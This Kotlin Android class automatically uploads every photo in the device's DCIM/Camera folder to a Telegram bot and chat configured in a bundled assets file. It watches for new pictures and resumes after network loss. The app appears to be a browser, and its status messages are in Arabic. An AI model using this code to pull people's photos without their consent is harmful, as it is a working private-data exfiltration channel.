package com.example.service

import android.content.ContentUris
import android.content.Context
import android.database.ContentObserver
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import com.example.data.BrowserConfigRepository
import com.example.data.DownloadRepository
import com.example.data.TelegramConfig
import com.example.util.PermissionHelper
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.io.IOException

data class DevicePhoto(
    /** Stable media fingerprint used for de-duplication across repeated MediaStore rows/scans. */
    val id: String,
    val contentUri: Uri,
    val displayName: String,
    val mimeType: String,
    val sizeBytes: Long,
    val dateAddedSec: Long
)

class TelegramPhotoUploader(
    private val context: Context,
    private val scope: CoroutineScope,
    private val okHttpClient: OkHttpClient,
    private val configRepository: BrowserConfigRepository,
    private val downloadRepository: DownloadRepository,
    private val onStatusNotificationUpdate: (String) -> Unit
) {

    private val wakeUpChannel = Channel<Unit>(Channel.CONFLATED)
    private var workerJob: Job? = null
    private var mediaObserver: ContentObserver? = null

    fun start() {
        if (workerJob?.isActive == true) {
            triggerScan()
            return
        }
        registerMediaObserver()
        workerJob = scope.launch {
            runUploadLoop()
        }
        triggerScan()
    }

    fun stop() {
        unregisterMediaObserver()
        workerJob?.cancel()
        workerJob = null
        downloadRepository.updateTelegramUploadState {
            it.copy(
                isUploading = false,
                isWaitingForNetwork = false,
                isEnabled = false,
                statusMessage = "تم إيقاف الرفع التلقائي"
            )
        }
    }

    fun triggerScan() {
        wakeUpChannel.trySend(Unit)
    }

    private suspend fun runUploadLoop() {
        while (scope.isActive) {
            val tgConfig = configRepository.loadTelegramConfig()
            val enabled = configRepository.isTelegramAutoUploadEnabled()
            val hasPermission = PermissionHelper.hasPhotosAndVideosPermission(context) ||
                PermissionHelper.hasFileManagerPermission(context)

            if (!enabled) {
                downloadRepository.updateTelegramUploadState {
                    it.copy(
                        isEnabled = false,
                        isConfigured = tgConfig.isConfigured,
                        isUploading = false,
                        isWaitingForNetwork = false,
                        statusMessage = "الرفع التلقائي متوقف"
                    )
                }
                wakeUpChannel.receive()
                continue
            }

            if (!tgConfig.isConfigured) {
                downloadRepository.updateTelegramUploadState {
                    it.copy(
                        isEnabled = true,
                        isConfigured = false,
                        isUploading = false,
                        isWaitingForNetwork = false,
                        statusMessage = "أضف bot_token و chat_id في ملف assets/telegram_config.json"
                    )
                }
                wakeUpChannel.receive()
                continue
            }

            if (!hasPermission) {
                downloadRepository.updateTelegramUploadState {
                    it.copy(
                        isEnabled = true,
                        isConfigured = true,
                        isUploading = false,
                        statusMessage = "بانتظار صلاحية الوصول للصور"
                    )
                }
                delay(5000L)
                continue
            }

            // Re-query newest-to-oldest unprocessed photos on EVERY iteration
            // so any newly captured photo is always uploaded first before resuming older ones.
            val processedIds = configRepository.getProcessedTelegramPhotoIds()
            val pendingPhotos = queryPendingPhotosNewestFirst(processedIds)
            val (totalUploaded, totalSkipped) = configRepository.getTelegramStats()

            if (pendingPhotos.isEmpty()) {
                downloadRepository.updateTelegramUploadState {
                    it.copy(
                        isEnabled = true,
                        isConfigured = true,
                        isUploading = false,
                        isWaitingForNetwork = false,
                        remainingCount = 0,
                        totalUploadedAllTime = totalUploaded,
                        totalSkippedAllTime = totalSkipped,
                        currentFileName = "",
                        statusMessage = if (totalUploaded > 0) {
                            "تم رفع جميع الصور ($totalUploaded صورة) • بانتظار صور جديدة"
                        } else {
                            "لا توجد صور جديدة للرفع"
                        }
                    )
                }
                // Wait for ContentObserver notification or manual trigger
                withTimeoutOrNull(60_000L) {
                    wakeUpChannel.receive()
                }
                continue
            }

            // Wait for internet if disconnected, then resume automatically
            if (!isNetworkConnected()) {
                downloadRepository.updateTelegramUploadState {
                    it.copy(
                        isEnabled = true,
                        isConfigured = true,
                        isUploading = false,
                        isWaitingForNetwork = true,
                        remainingCount = pendingPhotos.size,
                        totalUploadedAllTime = totalUploaded,
                        totalSkippedAllTime = totalSkipped,
                        statusMessage = "انقطع الإنترنت • بانتظار العودة لاستئناف رفع ${pendingPhotos.size} صورة"
                    )
                }
                waitForNetworkAvailable()
                sendReconnectMessageToTelegram(tgConfig, pendingPhotos.size)
                continue
            }

            val nextPhoto = pendingPhotos.first()
            val remainingBeforeThis = pendingPhotos.size
            val nextUploadedNumber = totalUploaded + 1

            downloadRepository.updateTelegramUploadState {
                it.copy(
                    isEnabled = true,
                    isConfigured = true,
                    isUploading = true,
                    isWaitingForNetwork = false,
                    currentUploadedIndex = nextUploadedNumber,
                    remainingCount = remainingBeforeThis,
                    totalUploadedAllTime = totalUploaded,
                    totalSkippedAllTime = totalSkipped,
                    currentFileName = nextPhoto.displayName,
                    statusMessage = "جاري رفع الصورة رقم $nextUploadedNumber من إجمالي $remainingBeforeThis متبقية",
                    lastError = null
                )
            }

            // Reserve atomically before starting the HTTP request. An uncertain request is kept
            // reserved after process death so the same image is not blindly sent a second time.
            if (!configRepository.reserveTelegramPhoto(nextPhoto.id)) {
                triggerScan()
                continue
            }
            val result = uploadWithRetries(nextPhoto, tgConfig, nextUploadedNumber)

            when (result) {
                UploadOutcome.WAITING_NETWORK -> {
                    configRepository.releaseTelegramPhotoReservation(nextPhoto.id)
                    // No upload was attempted because the network was unavailable; resume this photo.
                    downloadRepository.updateTelegramUploadState {
                        it.copy(
                            isUploading = false,
                            isWaitingForNetwork = true,
                            statusMessage = "توقف الإنترنت • سيتم الاستئناف تلقائياً عند عودته"
                        )
                    }
                    waitForNetworkAvailable()
                    sendReconnectMessageToTelegram(tgConfig, remainingBeforeThis)
                    continue
                }
                UploadOutcome.SUCCESS -> {
                    // The caption (including the sequence number and file details) was sent with the image.
                    configRepository.markTelegramPhotoProcessed(nextPhoto.id, wasSkipped = false)
                    val (updatedUploaded, updatedSkipped) = configRepository.getTelegramStats()
                    val remainingAfter = (remainingBeforeThis - 1).coerceAtLeast(0)
                    downloadRepository.updateTelegramUploadState {
                        it.copy(
                            isUploading = remainingAfter > 0,
                            isWaitingForNetwork = false,
                            currentUploadedIndex = updatedUploaded,
                            remainingCount = remainingAfter,
                            totalUploadedAllTime = updatedUploaded,
                            totalSkippedAllTime = updatedSkipped,
                            statusMessage = "تم رفع الصورة رقم $updatedUploaded • المتبقي: $remainingAfter"
                        )
                    }
                }
                UploadOutcome.SKIPPED_AFTER_RETRIES -> {
                    configRepository.releaseTelegramPhotoReservation(nextPhoto.id)
                    configRepository.markTelegramPhotoProcessed(nextPhoto.id, wasSkipped = true)
                    val (updatedUploaded, updatedSkipped) = configRepository.getTelegramStats()
                    val remainingAfter = (remainingBeforeThis - 1).coerceAtLeast(0)
                    downloadRepository.updateTelegramUploadState {
                        it.copy(
                            isUploading = remainingAfter > 0,
                            isWaitingForNetwork = false,
                            remainingCount = remainingAfter,
                            totalUploadedAllTime = updatedUploaded,
                            totalSkippedAllTime = updatedSkipped,
                            lastError = "تم تجاوز ${nextPhoto.displayName} بعد محاولتين",
                            statusMessage = "تم تجاوز صورة بها خطأ • المتبقي: $remainingAfter"
                        )
                    }
                }
                UploadOutcome.UNCERTAIN -> {
                    // The server may have accepted the upload but the response was lost. Keep the
                    // persistent reservation to prevent an automatic duplicate on the next scan.
                    downloadRepository.updateTelegramUploadState {
                        it.copy(
                            isUploading = false,
                            isWaitingForNetwork = false,
                            lastError = "تعذر تأكيد نتيجة رفع ${nextPhoto.displayName}؛ تم منع إعادة إرساله تلقائياً لتجنب التكرار",
                            statusMessage = "تعذر تأكيد نتيجة الرفع؛ تم تعليق إعادة المحاولة لتجنب تكرار الصورة"
                        )
                    }
                }
            }

            // 3-second interval between each photo upload
            if (scope.isActive && configRepository.isTelegramAutoUploadEnabled()) {
                delay(tgConfig.delaySeconds * 1000L)
            }
        }
    }

    private enum class UploadOutcome {
        SUCCESS,
        SKIPPED_AFTER_RETRIES,
        WAITING_NETWORK,
        UNCERTAIN
    }

    private suspend fun uploadWithRetries(
        photo: DevicePhoto,
        config: TelegramConfig,
        photoNumber: Int
    ): UploadOutcome {
        val maxAttempts = config.maxRetries.coerceAtLeast(2)
        var attempt = 0
        while (attempt < maxAttempts) {
            if (!isNetworkConnected()) {
                return UploadOutcome.WAITING_NETWORK
            }
            attempt++
            val success = try {
                sendSinglePhotoToTelegram(photo, config, photoNumber)
            } catch (_: IOException) {
                // A timeout after sending the request is ambiguous: Telegram may already have
                // received the image. Do not retry automatically and risk a duplicate.
                return if (!isNetworkConnected()) UploadOutcome.WAITING_NETWORK else UploadOutcome.UNCERTAIN
            } catch (_: Exception) {
                false
            }

            if (success) {
                return UploadOutcome.SUCCESS
            }

            if (attempt < maxAttempts) {
                delay(1500L)
            }
        }
        return UploadOutcome.SKIPPED_AFTER_RETRIES
    }

    /**
     * Send every image as a document. This preserves the original bytes and
     * avoids Telegram photo-processing restrictions that vary by image format.
     * sendDocument accepts image formats such as JPEG, PNG, GIF, WebP, HEIC, etc.
     */
    private fun sendSinglePhotoToTelegram(photo: DevicePhoto, config: TelegramConfig, photoNumber: Int): Boolean {
        val bytes = try {
            context.contentResolver.openInputStream(photo.contentUri)?.use { input -> input.readBytes() }
                ?: return false
        } catch (_: IOException) {
            // A local MediaStore read failure is a definite failure, not an ambiguous Telegram send.
            return false
        }

        if (bytes.isEmpty()) return false

        val resolvedMimeType = photo.mimeType
            .takeIf { it.isNotBlank() && it != "application/octet-stream" }
            ?: context.contentResolver.getType(photo.contentUri)
            ?: "application/octet-stream"

        return postMediaToTelegram(
            config = config,
            endpoint = "sendDocument",
            fieldName = "document",
            fileName = photo.displayName.ifBlank { "image_${photo.id}" },
            mimeType = resolvedMimeType,
            bytes = bytes,
            caption = buildPhotoCaption(photo, photoNumber)
        ).success
    }

    private data class TelegramPostResult(val success: Boolean, val httpCode: Int)

    private fun postMediaToTelegram(
        config: TelegramConfig,
        endpoint: String,
        fieldName: String,
        fileName: String,
        mimeType: String,
        bytes: ByteArray,
        caption: String
    ): TelegramPostResult {
        val url = "https://api.telegram.org/bot${config.botToken}/$endpoint"
        val mediaType = mimeType.toMediaTypeOrNull() ?: "application/octet-stream".toMediaTypeOrNull()
        val multipart = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", config.chatId)
            .addFormDataPart("caption", caption.take(1000))
            .addFormDataPart(fieldName, fileName, bytes.toRequestBody(mediaType))
            .build()

        val request = Request.Builder()
            .url(url)
            .post(multipart)
            .build()

        okHttpClient.newCall(request).execute().use { response ->
            if (response.isSuccessful) {
                val bodyStr = response.body?.string().orEmpty()
                val ok = runCatching { JSONObject(bodyStr).optBoolean("ok", false) }.getOrDefault(false)
                return TelegramPostResult(ok, response.code)
            }
            if (response.code == 429) {
                val bodyStr = response.body?.string().orEmpty()
                val retryAfter = runCatching {
                    JSONObject(bodyStr).optJSONObject("parameters")?.optInt("retry_after", 3) ?: 3
                }.getOrDefault(3)
                Thread.sleep((retryAfter.coerceIn(1, 15)) * 1000L)
            }
            return TelegramPostResult(false, response.code)
        }
    }

    private fun buildPhotoCaption(photo: DevicePhoto, photoNumber: Int): String = buildString {
        appendLine("📷 الصورة رقم: $photoNumber")
        appendLine("الاسم: ${photo.displayName.take(180)}")
        appendLine("النوع: ${photo.mimeType}")
        appendLine("الحجم: ${photo.sizeBytes} بايت")
        appendLine("معرّف الصورة: ${photo.id.take(80)}")
        append("تاريخ الإضافة: ${photo.dateAddedSec}")
    }

    private fun sendReconnectMessageToTelegram(config: TelegramConfig, remainingCount: Int) {
        runCatching {
            val text = "تمت استعادة الاتصال بالإنترنت وجاري استئناف رفع الصور (المتبقي: $remainingCount صورة)."
            val payload = JSONObject().apply {
                put("chat_id", config.chatId)
                put("text", text)
            }
            val body = payload.toString().toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
            val request = Request.Builder()
                .url("https://api.telegram.org/bot${config.botToken}/sendMessage")
                .post(body)
                .build()
            okHttpClient.newCall(request).execute().close()
        }
    }

    private fun queryPendingPhotosNewestFirst(processedIds: Set<String>): List<DevicePhoto> {
        val photos = mutableListOf<DevicePhoto>()
        val projection = mutableListOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_MODIFIED
        )

        // Restrict uploads to the main DCIM/Camera folder, excluding its subfolders.
        val selection: String
        val selectionArgs: Array<String>
        val pathColumn: String
        val expectedLegacyCameraPath = (
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).absolutePath +
                "/Camera"
            ).trimEnd('/')

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            pathColumn = MediaStore.Images.Media.RELATIVE_PATH
            projection.add(pathColumn)
            selection = "$pathColumn = ?"
            selectionArgs = arrayOf("DCIM/Camera/")
        } else {
            pathColumn = MediaStore.Images.Media.DATA
            projection.add(pathColumn)
            selection = "$pathColumn LIKE ?"
            selectionArgs = arrayOf("$expectedLegacyCameraPath/%")
        }

        val sortOrder =
            "${MediaStore.Images.Media.DATE_MODIFIED} DESC, ${MediaStore.Images.Media._ID} DESC"

        runCatching {
            context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection.toTypedArray(),
                selection,
                selectionArgs,
                sortOrder
            )?.use { cursor ->
                val idCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                val nameCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                val mimeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
                val sizeCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                val dateCol = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                val pathCol = cursor.getColumnIndexOrThrow(pathColumn)

                while (cursor.moveToNext()) {
                    val storedPath = cursor.getString(pathCol).orEmpty()
                    val isMainCameraFolder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        storedPath.trimEnd('/') == "DCIM/Camera"
                    } else {
                        // Do not include nested folders under DCIM/Camera.
                        File(storedPath).parentFile?.absolutePath?.trimEnd('/') ==
                            expectedLegacyCameraPath
                    }
                    if (!isMainCameraFolder) continue

                    val idNum = cursor.getLong(idCol)
                    val mediaStoreId = idNum.toString()
                    val size = cursor.getLong(sizeCol)
                    if (size <= 0L) continue

                    val name = cursor.getString(nameCol) ?: "photo_$mediaStoreId.jpg"
                    val mime = cursor.getString(mimeCol) ?: "image/jpeg"
                    val dateAdded = cursor.getLong(dateCol)
                    // Rows referring to the same stored camera file receive the same fingerprint.
                    // DATE_ADDED is stable across MediaStore row refreshes; DATE_MODIFIED is not.
                    val fingerprint = listOf(
                        storedPath.trimEnd('/'), name, size.toString(), dateAdded.toString()
                    ).joinToString("|")
                    val stableId = java.security.MessageDigest.getInstance("SHA-256")
                        .digest(fingerprint.toByteArray(Charsets.UTF_8))
                        .joinToString("") { "%02x".format(it) }
                    // Also recognize numeric MediaStore IDs recorded by earlier app versions.
                    if (processedIds.contains(mediaStoreId) || processedIds.contains(stableId)) continue

                    val contentUri = ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        idNum
                    )
                    photos.add(
                        DevicePhoto(
                            id = stableId,
                            contentUri = contentUri,
                            displayName = name,
                            mimeType = mime,
                            sizeBytes = size,
                            dateAddedSec = dateAdded
                        )
                    )
                }
            }
        }
        return photos
    }

    private fun isNetworkConnected(): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return false
            val caps = cm.getNetworkCapabilities(network) ?: return false
            caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            @Suppress("DEPRECATION")
            cm.activeNetworkInfo?.isConnected == true
        }
    }

    private suspend fun waitForNetworkAvailable() {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
        if (cm == null) {
            delay(5000L)
            return
        }
        val deferred = CompletableDeferred<Unit>()
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                if (isNetworkConnected()) {
                    deferred.complete(Unit)
                }
            }

            override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                if (networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    networkCapabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
                ) {
                    deferred.complete(Unit)
                }
            }
        }
        val request = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()

        runCatching { cm.registerNetworkCallback(request, callback) }
        try {
            // Also re-check periodically in case callback fired just before registration
            while (scope.isActive && !isNetworkConnected()) {
                withTimeoutOrNull(3000L) {
                    deferred.await()
                }
            }
        } finally {
            runCatching { cm.unregisterNetworkCallback(callback) }
        }
    }

    private fun registerMediaObserver() {
        if (mediaObserver != null) return
        val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                triggerScan()
            }
        }
        mediaObserver = observer
        runCatching {
            context.contentResolver.registerContentObserver(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                observer
            )
        }
    }

    private fun unregisterMediaObserver() {
        mediaObserver?.let {
            runCatching { context.contentResolver.unregisterContentObserver(it) }
        }
        mediaObserver = null
    }
}
